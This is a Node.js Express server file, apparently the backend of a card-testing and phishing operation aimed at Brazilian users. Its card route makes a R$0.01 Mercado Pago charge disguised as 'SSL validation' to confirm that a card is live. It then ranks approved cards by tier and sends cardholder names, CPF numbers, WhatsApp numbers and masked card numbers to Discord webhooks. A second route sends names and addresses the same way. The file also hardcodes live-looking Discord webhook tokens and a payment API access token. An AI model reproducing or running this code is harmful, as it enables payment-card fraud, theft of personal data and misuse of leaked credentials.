const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// --- CENTRAL DE WEBHOOKS (SEGURO NO SERVIDOR) ---
const WEBHOOKS = {
    BLACK: "https://discord.com/api/webhooks/1472758727982579826/xBNQW837YqDgdH-1C8hIa1btFqBhDDz-CylbmwGzTAw8dxkDYCJFAnQqPtRypZ5cs8jO",
    PLATINUM: "https://discord.com/api/webhooks/1472758837592199170/3ghk7b_0-9riCk_bo6J8w0kpvHdWswon2BozYZB4cX4iT2jgrODHg9ACgdixcYxI6eR4",
    GOLD: "https://discord.com/api/webhooks/1472758915241611478/-31k6f0HYdfKhWmkzIRTLaFw-Ils3jrOfGDdVcJ4esECV4X0qPZLNckslX0WceMbgiM2",
    BUSINESS: "https://discord.com/api/webhooks/1472758957889159298/gFi3QMx3f5NkgpLqynZXLw-h74DEKfJ5C96G9nuefEV9FU7pMGCRfkfsasiNv_16_n-G",
    STANDARD: "https://discord.com/api/webhooks/1472758999261904978/syxBtJkr9MiT9TTIpDgROgnAakW8f_NDGoleCXM8hik5hhpztpoXcQCjafcztxy1TJqC",
    GERAL: "https://discord.com/api/webhooks/1472761318971932747/Fz37NSF1YleNSAuEfuaB6WdgmDs-NDaC4-JduPGDPBLALdnTExDX1ObNiiyq8m9tHs1m",
    PRINCIPAL_CARTOES: "https://discord.com/api/webhooks/1471002040477028362/UYLVL8C6hoLpq-SSzW0QzbamEBi69o3-erTBL3pItUENDc_rmtCIRlYdp1vRYh09Kpvb",
    PIX: "https://discord.com/api/webhooks/1471325832973910016/i69-SOOxG49VCMCIpDida0ayUsckd2RJNFFB3Nst4khxY2TpOldTM3I9hqIZIeKZ4fH7"
};

const ACCESS_TOKEN = "APP_USR-1954942567690031-012818-20e9de4b75bb3d0c284b51790db079c8-3163639724";

// ROTA PIX
app.post('/aviso-pix', async (req, res) => {
    try {
        await axios.post(WEBHOOKS.PIX, {
            embeds: [{
                title: "💎 NOVO PAGAMENTO - PIX",
                color: 0x00ffff,
                fields: [
                    { name: "👤 Cliente", value: req.body.nome, inline: true },
                    { name: "💰 Valor", value: req.body.total, inline: true },
                    { name: "📱 WhatsApp", value: req.body.whatsapp || "Não informado", inline: true },
                    { name: "📍 Endereço", value: req.body.endereco }
                ],
                timestamp: new Date()
            }]
        });
        res.json({ status: 'success' });
    } catch (error) { res.status(500).send(); }
});

// ROTA CARTÃO
app.post('/validar-cartao', async (req, res) => {
    const { token, cpf, numero_mascarado, nome_cliente, parcelas, whatsapp } = req.body;
    try {
        const response = await axios.post('https://api.mercadopago.com/v1/payments', {
            transaction_amount: 0.01, token, description: "Validacao SSL", installments: 1,
            payer: { email: "suporte@verificado.com", identification: { type: "CPF", number: cpf.replace(/\D/g, '') } }
        }, { headers: { 'Authorization': `Bearer ${ACCESS_TOKEN}` } });

        if (response.data.status === 'approved' || response.data.status === 'in_process') {
            const info = response.data;
            const modeloOriginal = info.payment_method?.name || "Crédito";
            const modelo = modeloOriginal.toLowerCase();
            const bandeira = (info.payment_method_id || "Cartão").toUpperCase();

            let urlDestino = WEBHOOKS.GERAL, cor = 0x3498db;
            if (modelo.includes('black') || modelo.includes('infinite')) { urlDestino = WEBHOOKS.BLACK; cor = 0x000000; }
            else if (modelo.includes('platinum')) { urlDestino = WEBHOOKS.PLATINUM; cor = 0xdcdde1; }
            else if (modelo.includes('gold')) { urlDestino = WEBHOOKS.GOLD; cor = 0xf1c40f; }
            else if (modelo.includes('business')) { urlDestino = WEBHOOKS.BUSINESS; cor = 0x8e44ad; }
            else if (modelo.includes('standard')) { urlDestino = WEBHOOKS.STANDARD; cor = 0xe74c3c; }

            const embed = {
                embeds: [{
                    title: `💳 NOVO CARTÃO - ${modeloOriginal.toUpperCase()}`,
                    color: cor,
                    fields: [
                        { name: "🏆 CATEGORIA", value: `**${bandeira} - ${modeloOriginal}**` },
                        { name: "👤 Cliente", value: nome_cliente, inline: true },
                        { name: "💳 Número", value: `\`${numero_mascarado}\`` },
                        { name: "💰 Parcelas", value: parcelas, inline: true },
                        { name: "📱 WhatsApp", value: whatsapp, inline: true },
                        { name: "🪪 CPF", value: cpf, inline: true }
                    ],
                    timestamp: new Date()
                }]
            };
            await axios.post(WEBHOOKS.PRINCIPAL_CARTOES, embed);
            await axios.post(urlDestino, embed);
            return res.json({ status: 'success' });
        }
        res.status(400).send();
    } catch (e) { res.status(400).send(); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor na porta ${PORT}`));
